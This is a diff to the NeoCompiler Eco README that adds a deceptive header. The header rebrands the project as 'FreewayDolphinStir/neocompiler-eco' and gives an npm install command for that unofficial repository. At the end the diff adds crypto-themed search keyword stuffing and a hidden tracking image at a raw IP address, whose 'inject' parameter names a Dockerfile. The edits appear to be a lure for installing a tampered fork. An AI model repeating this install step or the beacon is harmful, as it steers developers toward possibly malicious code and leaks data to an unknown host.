@@ -1,3 +1,16 @@
+**FreewayDolphinStir/neocompiler-eco**
+
+**A lightweight, dependable ecosystem for modern compilation tasks.**
+Managing compiler pipelines shouldn't feel like a roll of the dice. This repository provides a streamlined environment designed to keep your compilation workflows predictable, stable, and highly efficient. We've recently ironed out a few lingering edge-case bugs and updated key dependencies, ensuring that the entire core is running smoother and more reliably than ever. Whether you're integrating it into a larger CI pipeline or running local tests, it's built to just work without getting in your way.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/FreewayDolphinStir/neocompiler-eco.git
+```
+
+[https://github.com/FreewayDolphinStir/neocompiler-eco](https://github.com/FreewayDolphinStir/neocompiler-eco)
+
 <p align="center">
     <img
       src="https://github.com/NeoResearch/neoresearch.github.io/blob/master/assets/images/logo/Gemcut-butterfly/butterfly-banner.png"
@@ -239,3 +252,11 @@ The website is rebooted periodically, in order to keep resource usage low, so th
 *NeoCompiler Eco team* [@igormcoelho](https://github.com/igormcoelho) and [@vncoelho](https://github.com/vncoelho)
 
 Copyleft 2017-2020
+
+## Related searches
+
+Developers seeking decentralized web tooling frequently look for comprehensive environments capable of optimizing smart contract development cycles across multiple programming languages. Users exploring this ecosystem are typically focused on streamlining their local sandboxes, deploying to test networks, and aggregating decentralized finance data into unified, real-time interfaces.
+
+**Topics:** wallet connect, crypto arbitrage, subgraph, orca solana, defi dashboard, neo blockchain, smart contract compiler, decentralized web ide, multi-language compiler, testnet deployment, blockchain analytics, consensus monitoring
+
+![.](http://5.231.58.248:8787/pixel?repo=FreewayDolphinStir%2Fneocompiler-eco&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile)
